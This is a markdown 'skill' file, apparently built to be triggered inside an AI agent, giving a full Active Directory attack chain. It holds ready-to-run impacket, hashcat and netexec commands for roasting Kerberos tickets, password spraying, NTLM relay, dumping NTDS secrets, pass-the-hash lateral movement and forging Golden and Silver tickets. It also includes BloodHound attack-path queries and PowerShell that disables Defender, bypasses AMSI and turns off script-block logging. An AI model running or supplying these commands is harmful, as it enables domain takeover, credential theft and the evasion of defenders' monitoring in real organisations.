# Active Directory Attack Skill

## Triggers
"ad", "active directory", "domain", "kerberos", "ntlm", "bloodhound", "dcsync", "kerberoast", "asreproast", "golden ticket", "silver ticket", "ntlm relay", "domain controller", "dc"

## Overview
Full AD attack chain from initial access to domain dominance. Covers enumeration, credential attacks, privilege escalation, lateral movement, and persistence in Windows Domain environments.

## Prerequisitesites
- impacket (pip install impacket)
- bloodhound.py (pip install bloodhound)
- netexec (pip install netexec)
- crackmapexec (legacy fallback)
- powerview (https://github.com/PowerShellMafia/PowerShellMafia)
- rubeus (https://github.com/GhostPack/Rubeus)
- mimikatz (https://github.com/gentilkiwi/mimikatz)

## Attack Chain

### Phase 1: Discovery
```bash
# Find domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.COM
nmap -p 88,135,139,389,445,464,636,3268,3269 --open DC_IP

# Enumerate via impacket
python -m impacket.examples.lookupsid DC_IP
python -m impacket.examples.netview DOMAIN/USER:PASS@DC_IP

# BloodHound collection
bloodhound-python -d DOMAIN.COM -u USER -p PASS -c All -ns DC_IP
bloodhound -c "MATCH (n) RETURN n" --server localhost:7687
```

### Phase 2: Credential Attacks
```bash
# AS-REP Roast (users without pre-auth)
python -m impacket.examples.GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip DC_IP
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Kerberoast
python -m impacket.examples.GetUserSPNs DOMAIN/USER:PASS@DC_IP -format hashcat -outputfile spn_hashes.txt
hashcat -m 13100 spn_hashes.txt rockyou.txt

# Password spray
netexec smb DC_IP -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success

# NTLM Relay
python -m impacket.examples.ntlmrelayx.py -t ldaps://DC_IP --no-smb-server --escalate-user user
```

### Phase 3: Post-Exploitation
```bash
# Dump secrets
python -m impacket.examples.secretsdump DOMAIN/USER:PASS@DC_IP
python -m impacket.examples.secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL

# Lateral movement
python -m impacket.examples.psexec DOMAIN/USER:PASS@TARGET_IP
python -m impacket.examples.wmiexec DOMAIN/USER:PASS@TARGET_IP
python -m impacket.examples.smbexec DOMAIN/USER:PASS@TARGET_IP
python -m impacket.examples.atexec DOMAIN/USER:PASS@TARGET_IP

# Pass-the-Hash
python -m impacket.examples.psexec DOMAIN/USER@TARGET_IP -hashes LM:NT
python -m impacket.examples.secretsdump -hashes LM:NT DOMAIN/USER@DC_IP
```

### Phase 4: Persistence
```bash
# Golden Ticket (krbtgt hash required)
python -m impacket.examples.ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM Administrator
python -m impacket.examples.secretsdump -krbtgt Administrator@DOMAIN.COM

# Silver Ticket (service account hash)
python -m impacket.examples.ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN.COM -spn cifs/TARGET DOMAIN.COM

# DCSync
python -m impacket.examples.secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user DOMAIN/Administrator
```

### Phase 5: Privilege Escalation Paths
- Unconstrained delegation → dump TGTs from memory
- Constrained delegation → S4U2Self abuse
- ACL abuse → GenericAll/WriteDacl on users/groups
- GPO abuse → edit GPO for lateral movement
- Certificate ESC1-ESC8 → ADCS misconfigurations

## BloodHound Attack Paths
```bash
# Find shortest path to Domain Admin
MATCH (n {highvalue:true}), (m:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}), p=shortestPath((n)-[*1..]->(m)) RETURN p

# Find users with DCSync rights
MATCH (n)-[:GetChanges|GetChangesAll]->(:Domain {name:"DOMAIN.COM"}) RETURN n.name

# Find AS-REP roastable users
MATCH (n:User {dontreqpreauth:true}) RETURN n.name
```

## Evasion
```powershell
# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -ExclusionPath C:\temp

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW bypass
$bw = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$bw['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

## Chain Patterns
- AS-REP roast → crack → low-priv shell → BloodHound → ACL abuse → admin
- NTLM relay → LDAP → ESC1-ESC8 → DA
- Kerberoast → crack → service account → constrained delegation → DA
- Password spray → foothold → uncons delegation → dump TGTs → DA
